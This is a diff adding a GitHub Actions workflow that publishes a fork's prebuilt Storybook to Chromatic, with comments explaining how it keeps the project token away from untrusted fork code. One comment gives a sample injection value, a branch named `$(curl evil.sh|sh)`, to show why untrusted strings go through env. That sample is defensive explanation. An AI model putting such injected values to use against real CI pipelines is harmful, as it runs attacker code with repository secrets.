@@ -1,0 +1,87 @@
+name: 🎨 Chromatic Fork — Publish
+
+# ── Part 2 of 2: has the token, never runs fork code ────────────────────────
+#
+# Triggered by "Chromatic Fork — Build" finishing. `workflow_run` workflows are
+# always taken from the default branch and run in the context of the base
+# repository, which is why this one can hold CHROMATIC_PROJECT_TOKEN safely.
+#
+# The rules that keep that safe, all of which matter:
+#
+#   * Check out the BASE repo (default ref), never the PR head. Everything
+#     executed here — bun install, the chromatic CLI — comes from trusted main.
+#   * The only fork-derived input is the built Storybook artifact. It is
+#     uploaded to Chromatic and rendered in *their* sandbox; it is never
+#     executed in this runner.
+#   * Untrusted strings (branch names, repo slugs) are passed through `env:`
+#     and quoted, never interpolated straight into a `run:` block, where a
+#     branch called `$(curl evil.sh|sh)` would otherwise execute.
+#
+# NOTE: workflow_run only fires for workflow files present on the DEFAULT
+# branch, so this has no effect until it is merged to main.
+
+on:
+  workflow_run:
+    workflows: ["🎨 Chromatic Fork — Build"]
+    types: [completed]
+
+permissions:
+  contents: read
+  actions: read   # required to download the artifact from the triggering run
+
+concurrency:
+  group: chromatic-fork-publish-${{ github.event.workflow_run.head_sha }}
+  cancel-in-progress: true
+
+jobs:
+  publish:
+    name: Visual regression (fork)
+    runs-on: ubuntu-latest
+    if: github.event.workflow_run.conclusion == 'success'
+
+    steps:
+      # Trusted code only: the default branch of this repo, not the PR head.
+      - name: Checkout base repository
+        uses: actions/checkout@v6
+        with:
+          fetch-depth: 0
+
+      - name: Download Storybook built from the fork
+        uses: actions/download-artifact@v4
+        with:
+          name: storybook-static
+          path: storybook-static
+          run-id: ${{ github.event.workflow_run.id }}
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+
+      # Chromatic resolves CHROMATIC_SHA against local git history to pick a
+      # baseline. The fork's commit isn't in this clone, so fetch it. Without
+      # this Chromatic still runs, but warns and loses commit ancestry.
+      - name: Fetch the fork's commit for baseline ancestry
+        env:
+          FORK_SLUG: ${{ github.event.workflow_run.head_repository.full_name }}
+          FORK_BRANCH: ${{ github.event.workflow_run.head_branch }}
+        run: |
+          git fetch --no-tags --depth=50 \
+            "https://github.com/${FORK_SLUG}.git" "${FORK_BRANCH}" || \
+            echo "Could not fetch fork ref; Chromatic will fall back to a shallow association."
+
+      - name: Setup Bun
+        uses: oven-sh/setup-bun@v2
+
+      # Installs from the base repo's package.json + bun.lock, not the fork's.
+      - name: Install dependencies
+        run: bun install
+
+      - name: Publish to Chromatic
+        env:
+          # Chromatic reads these to attribute the build to the fork's PR
+          # rather than to main. Verified against the CLI's own env handling.
+          CHROMATIC_SHA: ${{ github.event.workflow_run.head_sha }}
+          CHROMATIC_BRANCH: ${{ github.event.workflow_run.head_repository.full_name }}:${{ github.event.workflow_run.head_branch }}
+          CHROMATIC_SLUG: ${{ github.event.workflow_run.head_repository.full_name }}
+          CHROMATIC_PROJECT_TOKEN: ${{ secrets.CHROMATIC_PROJECT_TOKEN }}
+        run: |
+          bunx chromatic \
+            --storybook-build-dir storybook-static \
+            --exit-zero-on-changes
